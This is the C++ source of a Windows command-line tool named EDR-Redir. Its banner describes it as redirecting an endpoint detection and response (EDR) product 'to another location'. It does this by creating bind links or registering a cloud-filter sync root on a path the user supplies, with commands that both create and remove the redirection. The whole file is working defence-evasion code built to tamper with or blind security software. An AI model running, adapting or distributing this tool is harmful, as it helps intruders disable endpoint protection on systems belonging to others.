#include <Windows.h>
#include <iostream>
#include <bindlink.h>
#pragma comment(lib, "bindlink.lib")
#include <cfapi.h>
#pragma comment(lib, "CldApi.lib")

void PrintHresultInfo(HRESULT hr) {
    DWORD win32 = HRESULT_CODE(hr); // same as hr & 0xFFFF
    LPWSTR msg = nullptr;
    FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        nullptr,
        win32,
        0,
        (LPWSTR)&msg,
        0,
        nullptr
    );
    std::wcout << L"HRESULT: 0x" << std::hex << hr << L"  Win32: " << std::dec << win32 << L"\n";
    if (msg) { std::wcout << L"Message: " << msg << L"\n"; LocalFree(msg); }
}

int wmain(int argc, wchar_t* argv[])
{
    std::wcout << L"\nEDR-Redir.exe: Tool to redirect the EDR to another location\n"
        << L"\nGitHub:  https://github.com/TwoSevenOneT/EDR-Redir\n"
        << L"\n  Two Seven One Three: https://x.com/TwoSevenOneT\n"
        << L"\n==========================================================\n\n";

    if (argc != 4 && argc != 3)
    {
        std::wcerr << std::endl;
        std::wcerr << L"Bind link usage: EDR-Redir.exe bind <VirtualPath> <BackingPath>" << std::endl;
        std::wcerr << L"\tEDR-Redir.exe bind <VirtualPath>\n\t\tTo remove a link that was previously created" << std::endl;
        std::wcerr << std::endl;
        std::wcerr << L"Cloud filter usage: EDR-Redir.exe cloud <SyncRootPath> create" << std::endl;
        std::wcerr << L"\tEDR-Redir.exe cloud <SyncRootPath>\n\t\tTo remove a syncroot that was previously created" << std::endl;
        return 1;
    }
    HRESULT hr;

    std::wstring arg1 = argv[1];
    if (arg1 == L"cloud")
    {
        //Cloud filter mode
        if (argc == 3)
        {
			hr = CfUnregisterSyncRoot(argv[2]);
			if (FAILED(hr))
			{
				std::wcerr << L"Failed to unregister sync root. HRESULT: " << hr << std::endl;
				PrintHresultInfo(hr);
				return 1;
			}
			std::wcout << L"Unregister Sync Root: " << argv[2] << L" successfully" << std::endl;
			return 0;
        }
        LPCWSTR syncRootPath = argv[2];
        CF_SYNC_REGISTRATION registration = {};
        registration.StructSize = sizeof(CF_SYNC_REGISTRATION);
        registration.ProviderName = L"MySyncProvider";
        registration.ProviderVersion = L"1.0";

        CF_SYNC_POLICIES policies = { 0 };
        policies.StructSize = sizeof(CF_SYNC_POLICIES);
        policies.StructSize = sizeof(CF_SYNC_POLICIES);
        policies.HardLink = CF_HARDLINK_POLICY_ALLOWED;
        policies.Hydration.Primary = CF_HYDRATION_POLICY_FULL;
        policies.InSync = CF_INSYNC_POLICY_NONE;
        policies.Population.Primary = CF_POPULATION_POLICY_PARTIAL;

        hr = CfRegisterSyncRoot(syncRootPath, &registration, &policies, CF_REGISTER_FLAG_NONE);
        if (FAILED(hr)) 
        {
            std::wcerr << L"Failed to register sync root. HRESULT: " << hr << std::endl;
            PrintHresultInfo(hr);
            return 1;
        }
        std::wcout << L"Register Sync Root: " << argv[2] << L" successfully" << std::endl;
        return 0;
        //
	}
	else if (arg1 == L"bind")
	{
		//bind link filter mode
        if (argc == 3)
        {
            hr = RemoveBindLink(argv[2]);
            if (FAILED(hr))
            {
                std::wcerr << L"Failed to unregister sync root. HRESULT: " << hr << std::endl;
                PrintHresultInfo(hr);
                return 1;
            }
            std::wcout << L"Remove Bind Link: " << argv[2] << L" successfully" << std::endl;
            return 0;
        }

        std::wstring virtualPath = argv[2];
        std::wstring backingPath = argv[3];

        hr = CreateBindLink(virtualPath.c_str(), backingPath.c_str(), CREATE_BIND_LINK_FLAG_NONE, 0, nullptr);
        if (FAILED(hr))
        {
            std::wcerr << L"CreateBindLink failed, HRESULT=0x" << std::hex << hr << L"\n";
            PrintHresultInfo(hr);
            return 1;
        }
        std::wcout << L"CreateBindLink: (VirtualPath) <==> (BackingPath): " << virtualPath << L" <==> " << backingPath << L" successfully" << std::endl;
        //
	}
     

    return 0;
}
